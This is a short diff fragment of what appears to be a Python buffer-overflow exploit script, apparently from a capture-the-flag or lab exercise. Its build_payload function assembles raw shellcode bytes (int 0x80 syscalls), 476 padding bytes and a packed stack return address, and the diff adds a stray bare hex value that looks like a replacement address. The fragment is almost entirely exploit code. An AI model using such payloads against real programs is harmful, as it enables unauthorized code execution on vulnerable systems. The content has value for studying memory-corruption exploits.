@@ -105,6 +105,7 @@ def build_payload():
     payload += b"\xcd\x80\x31\xc0\x40\xcd\x80"
     payload += b'\x41'*476
     payload += p32(0xffcf1b68)
+    0xffb959d8
     return payload
 
 
